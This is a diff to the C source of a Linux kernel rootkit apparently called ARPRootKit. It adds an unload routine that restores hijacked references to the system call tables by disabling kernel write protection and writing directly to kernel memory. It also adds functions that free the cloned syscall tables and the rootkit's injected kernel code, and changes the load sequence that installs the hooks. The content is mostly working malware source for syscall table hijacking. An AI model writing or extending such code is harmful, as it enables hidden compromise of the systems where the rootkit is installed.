@@ -170,6 +170,10 @@ void *my_vmalloc_range(ulong size, ulong start, ulong end, gfp_t gfp_mask, pgpro
 int clone_syscall_tables(void);
 int patch_syscall_tables_refs(void);
 int install_rkkernel(void);
+int unpatch_syscall_tables_refs(void);
+inline void release_cloned_syscall_tables(void);
+inline void release_rkkernel(void);
+int unload(void);
 
 /*
  * Global variables.
@@ -314,6 +318,7 @@ int load(void) {
 	 */
 	if (install_rkkernel()) {
 		perr("Sorry, can't install_rkkernel().\n");
+		return -2;
 	}
 
 	//kernel_test();
@@ -323,21 +328,82 @@ int load(void) {
 	pinfo("Calling RK's Kernel test function ...\n");
 	f_kernel_test();
 
+	create_read_list();
+
 	// uncomment for testing:
 	//(*f_kfree())(kernel_addr);
 
-	return -1;
+	//return -1;
 
 	/*
 	 * Setup hooks, and we're done.
 	 */
 	install_hooks();
 	sleep(ret);
-	uninstall_hooks();
-
-	//pinfo("ARPRootKit successfully installed!\n");
+	if (unload() == -2) {
+		perr("Sorry, error when unload().\n");
+		return -2;
+	}
 
 	return -1;
+}
+
+int unload(void) {
+	uninstall_hooks();
+	if (unpatch_syscall_tables_refs() == -2) {
+		perr("Sorry, error while unpatching syscall tables refs. Aborting ...\n");
+		return -2;
+	}
+	uninstall_hooks();
+	//destroy_read_list();
+	//release_cloned_syscall_tables();
+	//release_rkkernel();
+
+	return -1;
+}
+
+inline void release_cloned_syscall_tables(void) {
+	vfree(my_sct);
+	vfree(my_ia32sct);
+}
+
+inline void release_rkkernel(void) {
+	vfree(kernel_addr);
+}
+
+int unpatch_syscall_tables_refs(void) {
+	int n = 0, addr = 0, ret = 0, *p = NULL;
+
+	// first patch refs to sys_call_table, and later to ia32_sys_call_table
+	for (; n < nsct_refs; n++) {
+		p = (int *) sct_refs[n];
+		pinfo("unpatching ref %d of sys_call_table %lx ...\n", n, p);
+	    pinfo("value before patch = %x\n", *p);
+		disable_wp();
+		addr = (int) sys_call_table;
+	    ret = probe_kernel_write(p, &addr, sizeof(int));
+		enable_wp();
+		pinfo("value after patch = %lx\n", *p);
+		if (ret != 0) {
+			return -2;
+		}
+	}
+
+    for (n = 0; n < nia32sct_refs; n++) {
+        p = (int *) ia32sct_refs[n];
+        pinfo("unpatching ref %d of ia32_sys_call_table %lx ...\n", n, p);
+        pinfo("value before patch = %x\n", *p);
+        disable_wp();
+        addr = (int) ia32_sys_call_table;
+        ret = probe_kernel_write(p, &addr, sizeof(int));
+        enable_wp();
+        pinfo("value after patch = %lx\n", *p);
+        if (ret != 0) {
+            return -2;
+        }
+    }
+
+	return 0;
 }
 
 void install_hooks(void) {
